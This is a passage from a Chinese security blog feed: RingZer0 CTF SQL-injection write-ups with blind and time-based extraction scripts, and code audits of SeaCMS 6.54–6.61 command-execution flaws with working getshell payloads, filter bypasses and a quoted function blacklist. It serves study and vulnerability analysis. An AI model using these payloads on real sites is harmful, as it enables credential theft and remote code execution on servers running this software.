<span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        print(<span class="string">'checking'</span>,chr(j))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin' and substr((select password from users),%d,1)='%s' or '"</span>%(i,chr(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'123'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print(<span class="string">"password:"</span>,password)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">122</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password:"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="comment">#password: 4dm1nzP455</span></span><br></pre></td></tr></table></figure><p>登录成功后获得flag</p><h4 id="Internet-As-A-Service"><a href="#Internet-As-A-Service" class="headerlink" title="Internet As A Service"></a>Internet As A Service</h4><p>看别人提示的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=1&apos; || 1e0union select schema_name,2,3 from information_schema.schemata%23</span><br></pre></td></tr></table></figure><p>没搞得太懂，<code>1e0union</code>貌似是为了绕过<code>%20union</code>的过滤</p><p>数据库名：<code>iaas</code></p><p>注表payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=1&apos; || 1e0union select table_name,2,3 from information_schema.tables where table_schema like &apos;iaas&apos;%23</span><br></pre></td></tr></table></figure><p>表名：<code>iaas,rz_flag</code></p><p>注列payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=1&apos; || 1e0union select column_name,2,3 from information_schema.columns where table_name like &apos;rz_flag&apos;%23</span><br></pre></td></tr></table></figure><p>列名：<code>flag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=1&apos; || 1e0union select flag,2,3 from rz_flag%23</span><br></pre></td></tr></table></figure><h4 id="Login-portal-4"><a href="#Login-portal-4" class="headerlink" title="Login portal 4"></a>Login portal 4</h4><p>这题不论用户名是否存在，密码错误都会返回<code>Invalid username / password.</code>尝试用户名<code>username=admin&#39; or &#39;1</code>，提示非法字符，猜测过滤了<code>or+空格+任意字符</code>，可以用<code>||</code>代替<code>or</code></p><p>这题只能用延时注入，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; || if(ascii(substr((select password from users),1,1))=100,sleep(3),1) || &apos;&amp;password=1</span><br></pre></td></tr></table></figure><p>脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://ringzer0ctf.com/challenges/6"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7'</span></span><br><span class="line">    &#125;</span><br><span class="line">password = <span class="string">""</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        print(<span class="string">"checking"</span>,chr(j))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"' || if(ascii(substr((select password from users),%d,1))=%d,sleep(5),1) || '"</span>%(i,j),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url,data=data,headers=headers,timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print(<span class="string">"password:"</span>,password)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password:"</span>,password)</span><br></pre></td></tr></table></figure><p>成功登录后获取flag</p>]]></content>
    
    <summary type="html">
    
      sql
    
    </summary>
    
      <category term="sql" scheme="https://Foxgrin.github.io/categories/sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--seacms命令执行漏洞（6.45后续版本）</title>
    <link href="https://Foxgrin.github.io//posts/10257/"/>
    <id>https://Foxgrin.github.io//posts/10257/</id>
    <published>2019-04-03T08:15:00.000Z</published>
    <updated>2019-04-06T02:49:11.598Z</updated>
    
    <content type="html"><![CDATA[<p>继续跟踪海洋cms 6.45后续版本是否修复命令执行漏洞<a id="more"></a></p><h2 id="seacms-6-54"><a href="#seacms-6-54" class="headerlink" title="seacms 6.54"></a>seacms 6.54</h2><p>参考链接：<a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a></p><p>在之前的6.45版本中，由于服务器未对参数<code>$order</code>进行合理的过滤：<code>$order = !empty($order)?$order:time;</code>,导致<code>$order</code>内容替换模板<code>$content</code>内容：<code>$content = str_replace(&quot;{searchpage:ordername}&quot;,$order,$content);</code>，之后<code>$content</code>内容传入<code>parseIf</code>函数，通过正则匹配规则<code>{if:(.*?)}(.*?){end if}</code>匹配后的内容传入命令执行函数<code>@eval(&quot;if(&quot;.$strIf.&quot;) { \$ifFlag=true;} else{ \$ifFlag=false;}&quot;);</code>，最终导致了getshell</p><p>这次我继续跟踪6.54版本，首先看一下它的更新日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">更新日期：2017年8月7日 v6.54</span><br><span class="line">修复：紧急修复2处高危安全漏洞</span><br><span class="line"></span><br><span class="line">更新日期：2017年8月6日 v6.53</span><br><span class="line">新增：微信公众平台模块</span><br><span class="line">优化：采集逻辑</span><br><span class="line">修复：部分文字描述错误</span><br><span class="line">更新日期：2017年2月18日 v6.46</span><br><span class="line">修复：两处安全问题</span><br><span class="line"></span><br><span class="line">更新日期：2017年2月6日 v6.45</span><br><span class="line">修复：一处安全问题</span><br></pre></td></tr></table></figure><p>审计后发现，与6.45版本不同的是，6.54版本中<code>/search.php</code>的第65行对参数<code>$order</code>进行了白名单的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$order = ($order == <span class="string">"commend"</span> || $order == <span class="string">"time"</span> || $order == <span class="string">"hit"</span>) ? $order : <span class="string">""</span>;</span><br></pre></td></tr></table></figure><p>看似成功修复了6.45版本的<code>order</code>参数导致的命令执行getshell漏洞，但是本质上还是未对该漏洞进行修复，<code>order</code>参数只是6.45版本中最好利用的命令注入点，并不代表其他参数不存在注入点</p><p>下面我们再重新梳理一遍该cms对用户输入的过滤点，首先是全局文件<code>/include/common.php</code>的转义处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个是在<code>/search.php</code>本文件下对用户输入参数的过滤，包括<code>RemoveXSS</code>函数过滤和最多20字符的限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$jq = RemoveXSS(stripslashes($jq));</span><br><span class="line">$jq = addslashes(cn_substr($jq,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$area = RemoveXSS(stripslashes($area));</span><br><span class="line">$area = addslashes(cn_substr($area,<span class="number">20</span>));</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>虽然一个参数无法绕过这些过滤，但是我们知道模板内容替换的参数不止一个，所以，可以用多个参数组合替换的方法进行getshell</p><p>下面贴上参考文章抓取的攻击payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</span><br></pre></td></tr></table></figure><p>可以看到，注入点已经不止一个，也不是之前的<code>order</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoSearchPage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:page&#125;"</span>,$page,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;seacms:searchword&#125;"</span>,$searchword,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;seacms:searchnum&#125;"</span>,$TotalResult,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:ordername&#125;"</span>,$order,$content);</span><br><span class="line">......</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:year&#125;"</span>,$year,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:area&#125;"</span>,$area,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:letter&#125;"</span>,$letter,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:lang&#125;"</span>,$yuyan,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:jq&#125;"</span>,$jq,$content);</span><br><span class="line">    ......</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:state&#125;"</span>,$state2,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:money&#125;"</span>,$money2,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:ver&#125;"</span>,$ver,$content);</span><br><span class="line">......</span><br><span class="line">    $content=$mainClassObj-&gt;parseIf($content);</span><br></pre></td></tr></table></figure><p>以上是<code>/search.php</code>文件中对模板内容<code>{searchpage:}</code>替换payload所用参数的顺序，根据上面的payload，最终替换的<code>$content</code>内容包含了</p><p><code>{if:eval(join($_POST[9]))}</code></p><p>然后传入<code>parseIf</code>函数中的命令执行函数<code>eval</code>，最终执行<code>eval(&quot;if(eval(join($_POST[9])))&quot;)</code>，下面是最终执行的效果图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>虽然是通过多个参数拼接起来，但是最关键的注入点还是在于参数<code>$searchword</code>，所以，根据参考文章中的修复方法是过滤参数<code>$searchword</code>中的<code>{searchpage:</code>内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($searchword,<span class="string">'&#123;searchpage:'</span>)) <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><h2 id="seacms-6-55"><a href="#seacms-6-55" class="headerlink" title="seacms 6.55"></a>seacms 6.55</h2><p>拿到6.55版本源码，直接按6.54的payload测试，发现行不通，看来有进行一些修复，审计完，对比6.54，一方面还是对参数<code>$order</code>进行了一个白名单过滤，位置在<code>/search.php</code>第66-67行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$orderarr=<span class="keyword">array</span>(<span class="string">'id'</span>,<span class="string">'idasc'</span>,<span class="string">'time'</span>,<span class="string">'timeasc'</span>,<span class="string">'hit'</span>,<span class="string">'hitasc'</span>,<span class="string">'commend'</span>,<span class="string">'commendasc'</span>,<span class="string">'score'</span>,<span class="string">'scoreasc'</span>);</span><br><span class="line"><span class="keyword">if</span>(!(in_array($order,$orderarr)))&#123;$order=<span class="string">'time'</span>;&#125;</span><br></pre></td></tr></table></figure><p>当然，在6.54我们就已经分析过，造成漏洞的注入点不仅仅只有参数<code>$order</code>一个，还可以通过各个参数拼接</p><p>另外，在<code>parseIf</code>加入了对<code>$content</code>匹配内容结果数组<code>$iar</code>也进行了黑名单过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($iar <span class="keyword">as</span> $v)&#123;</span><br><span class="line">            $iarok[] = str_replace(<span class="keyword">array</span>(<span class="string">'unlink'</span>,<span class="string">'opendir'</span>,<span class="string">'mysqli_'</span>,<span class="string">'mysql_'</span>,<span class="string">'socket_'</span>,<span class="string">'curl_'</span>,<span class="string">'base64_'</span>,<span class="string">'putenv'</span>,<span class="string">'popen('</span>,<span class="string">'phpinfo'</span>,<span class="string">'pfsockopen'</span>,<span class="string">'proc_'</span>,<span class="string">'preg_'</span>,<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>,<span class="string">'_REQUEST'</span>,<span class="string">'_SESSION'</span>,<span class="string">'eval('</span>,<span class="string">'file_'</span>,<span class="string">'passthru('</span>,<span class="string">'exec('</span>,<span class="string">'system('</span>,<span class="string">'shell_'</span>), <span class="string">'@.@'</span>, $v);</span><br><span class="line">        &#125;</span><br><span class="line">        $iar = $iarok;</span><br></pre></td></tr></table></figure><p>可以看到，我们之前payload的<code>eval,_POST</code>都在黑名单数组中，最后被替换成了<code>@.@</code>，所以原来payload肯定是行不通的，那么，是否真的解决了安全问题呢，其实并没有，我们仔细看黑名单内容，就能发现，其实这里只过滤了一个php执行函数<code>eval</code>，<code>assert</code>函数并没有被过滤。另外，虽然<code>_GET,_POST,_COOKIE,_REQUEST</code>被过滤，但是<code>_SERVER</code>没有被过滤。所以，过滤并不完整，还是可以通过拼接参数的方法进行getshell，只不过换一个函数和全局变量罢了，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /seacms6.55/search.php?phpinfo();</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:a&#123;searchpage:area&#125;&#125;&amp;area=s&#123;searchpage:letter&amp;letter=ser&#123;searchpage:lang&#125;&amp;yuyan=t(&#123;searchpage:jq&#125;&amp;jq=$_S&#123;searchpage:ver&#125;&#125;&amp;&amp;ver=ERVER[QUERY_STRING])</span><br></pre></td></tr></table></figure><p>最后的执行效果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以，修复方法也还是需要针对参数<code>searchword</code>的<code>{searchpage:</code>内容</p><h2 id="seacms-6-61"><a href="#seacms-6-61" class="headerlink" title="seacms 6.61"></a>seacms 6.61</h2><p>6.61版本同样对参数<code>$order</code>进行了白名单过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$orderarr=<span class="keyword">array</span>(<span class="string">'id'</span>,<span class="string">'idasc'</span>,<span class="string">'time'</span>,<span class="string">'timeasc'</span>,<span class="string">'hit'</span>,<span class="string">'hitasc'</span>,<span class="string">'commend'</span>,<span class="string">'commendasc'</span>,<span class="string">'score'</span>,<span class="string">'scoreasc'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(in_array($order,$orderarr)))&#123;$order=<span class="string">'time'</span>;&#125;</span><br></pre></td></tr></table></figure><p>并且同样在<code>parseIf</code>函数中对<code>$iar</code>匹配数组进行了黑名单过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($iar <span class="keyword">as</span> $v)&#123;</span><br><span class="line">            $iarok[] = str_ireplace(<span class="keyword">array</span>(<span class="string">'unlink'</span>,<span class="string">'opendir'</span>,<span class="string">'mysqli_'</span>,<span class="string">'mysql_'</span>,<span class="string">'socket_'</span>,<span class="string">'curl_'</span>,<span class="string">'base64_'</span>,<span class="string">'putenv'</span>,<span class="string">'popen('</span>,<span class="string">'phpinfo'</span>,<span class="string">'pfsockopen'</span>,<span class="string">'proc_'</span>,<span class="string">'preg_'</span>,<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>,<span class="string">'_REQUEST'</span>,<span class="string">'_SESSION'</span>,<span class="string">'_SERVER'</span>,<span class="string">'assert'</span>,<span class="string">'eval('</span>,<span class="string">'file_'</span>,<span class="string">'passthru('</span>,<span class="string">'exec('</span>,<span class="string">'system('</span>,<span class="string">'shell_'</span>), <span class="string">'@.@'</span>, $v);</span><br><span class="line">        &#125;</span><br><span class="line">        $iar = $iarok;</span><br></pre></td></tr></table></figure><p>我们可以发现这个版本的黑名单相对于6.55版本添加过滤了关键字<code>assert</code>和<code>_SERVER</code></p><p>但是，在<code>search.php</code>中，又新添加了针对于6.54和6.55漏洞提出者提议的过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($searchword,<span class="string">'&#123;searchpage:'</span>)) &#123;ShowMsg(<span class="string">'请勿输入危险字符！'</span>,<span class="string">'index.php'</span>,<span class="string">'0'</span>,$cfg_search_time*<span class="number">1000</span>);<span class="keyword">exit</span>;&#125;</span><br></pre></td></tr></table></figure><p>即对参数<code>$searchword</code>的内容<code>{searchpage:</code>进行了过滤</p><p>这次的过滤可谓是比较全面的了，不仅仅是参数<code>$order</code>，也过滤了参数拼接，看似已经很安全，但是还是有大佬挖出来了，emmm再次不得不感叹有输入的地方就可能存在漏洞，百密一疏都可能导致漏洞的发生</p><p>贴上参考链接：<a href="https://www.anquanke.com/post/id/152764" target="_blank" rel="noopener">CVE-2018-14421——Seacms后台getshell分析</a></p><p>参考链接给出的漏洞处在后台管理-&gt;添加影片-&gt;图片地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][a]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][b]);//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><p>之后访问<code>/detail/?1.html&amp;a=assert&amp;b=phpinfo();</code>，<code>/search.php?searchtype=5&amp;a=assert&amp;b=phpinfo();</code>都可以成功getshell</p><p>先验证一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>添加后访问</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>都成功，说明payload有效，我们观察一下payload，其实挺像我们在6.45版本中<code>$order</code>参数的注入内容，所以猜测同样是替换模板进行命令执行的，但这都是猜测，要真正弄懂还是要一步步跟踪到漏洞根源</p><p>首先我们先抓包获取我们注入payload的参数名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>参数名为<code>v_pic</code>，并且接收该参数的文件名：<code>/backend/admin_video.php?action=save&amp;acttype=add</code>也知道了，那么接下来只需要在该文件中搜索关键字<code>v_pic</code>即可</p><p>在111行：<code>$v_pic = cn_substrR($v_pic,255);</code>获取该参数值，<code>cn_substrR</code>只是一个截取255长度的函数，不需要关注</p><p>之后在117行处：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可发现参数<code>$v_pic</code>拼接至变量<code>$insertSql</code>后添加到数据库中，到这里数据就添加成功了，也就是说，后台对我们输入的内容除了截取255长度的处理外无其他处理，此时，payload已经入库</p><p>之后我们在后台管理-&gt;管理影片</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以发现，我们添加的影片内容，在<code>/detail/?1.html</code>下可以访问，那么老样子，直接搜索关键字<code>v_pic</code>，在101行中搜索到：<code>$v_pic=$row[&#39;v_pic&#39;];</code>，跟踪变量<code>$row</code>，在23行中搜索到：<code>$row=$dsql-&gt;GetOne(&quot;Select d.*,p.body as v_playdata,p.body1 as v_downdata,c.body as v_content From</code>sea_data<code>d left join</code>sea_playdata<code>p on p.v_id=d.v_id left join</code>sea_content<code>c on c.v_id=d.v_id where d.v_id=&#39;$vId&#39;&quot;)</code></p><p>即从数据库中取出我们之前添加的<code>$v_pic</code>，之后在102行中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($v_pic))&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">' '</span>.$v_pic,<span class="string">'://'</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">$content=str_replace(<span class="string">"&#123;playpage:pic&#125;"</span>,$v_pic,$content);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$content=str_replace(<span class="string">"&#123;playpage:pic&#125;"</span>,<span class="string">'/'</span>.$GLOBALS[<span class="string">'cfg_cmspath'</span>].ltrim($v_pic,<span class="string">'/'</span>),$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行熟悉的模板内容替换，果然如之前猜测的一样，再搜索关键字<code>parseIf</code>，在161行中搜索到：<code>$content=$mainClassObj-&gt;parseIf($content);</code></p><p>接下来，只需要找到模板文件，就能弄清楚替换后内容，模板文件为：<code>/templets/default/html/content.html</code>，搜索关键字<code>{playpage:pic}</code>，在第22行中搜索到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class=&quot;videopic&quot; href=&quot;&#123;playpage:playlink&#125;&quot; title=&quot;&#123;playpage:name&#125;&quot; style=&quot;background: url(&#123;playpage:pic&#125;)  no-repeat; background-position:50% 50%; background-size: cover;&quot;&gt;</span><br></pre></td></tr></table></figure><p>所以，我们替换的内容即为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class=&quot;videopic&quot; href=&quot;&#123;playpage:playlink&#125;&quot; title=&quot;&#123;playpage:name&#125;&quot; style=&quot;background: url(&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][a]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][b]);//&#125;&#123;end if&#125;)  no-repeat; background-position:50% 50%; background-size: cover;&quot;&gt;</span><br></pre></td></tr></table></figure><p>替换后进入<code>parseIf</code>函数匹配到的内容即为：<code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code>，进入命令执行的内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="string">"if(1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//)&#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br></pre></td></tr></table></figure><p>在前面的分析中，我们知道<code>parseIf</code>函数中添加过滤了<code>assert</code>和<code>_SERVER</code>，但是还有个全局变量<code>$GLOBALS</code>未被过滤，它一个包含了全部变量的全局组合数组，变量的名字就是数组的键。也就是说<code>$GLOBALS[&#39;_GET&#39;]</code>就相当于<code>$_GET</code> ，那么<code>$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]</code>就相当于<code>$_GET[&#39;a&#39;]</code>，<code>$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);</code>，<code>?a=assert&amp;b=phpinfo();</code>就相当于<code>assert(phpinfo(););</code></p><p>最后附上参考链接的总结图：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/seacms/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--seacms6.45前台getshell</title>
    <link href="https://Foxgrin.github.io//posts/23000/"/>
    <id>https://Foxgrin.github.io//posts/23000/</id>
    <published>2019-04-02T11:15:00.000Z</published>
    <updated>2019-04-02T13:45:56.033Z</updated>
    
    <content type="html"><![CDATA[<p>这次上海ctf的web题中出现了之前bugku也有的经典海洋cms命令执行漏洞，趁着比赛刚结束刚好对海洋cms漏洞进行审计复现<a id="more"></a></p><h2 id="全局审计"><a href="#全局审计" class="headerlink" title="全局审计"></a>全局审计</h2><p>首先对网站的全局文件进行审计，在根目录文件<code>/index.php</code>中跟踪全局文件<code>/include/common.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#common.php 第45-48行</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现对GET,POST,COOKIE的键值取出作为新的变量，并对键值通过<code>_RunMagicQuotes</code>函数进行过滤，跟踪该函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 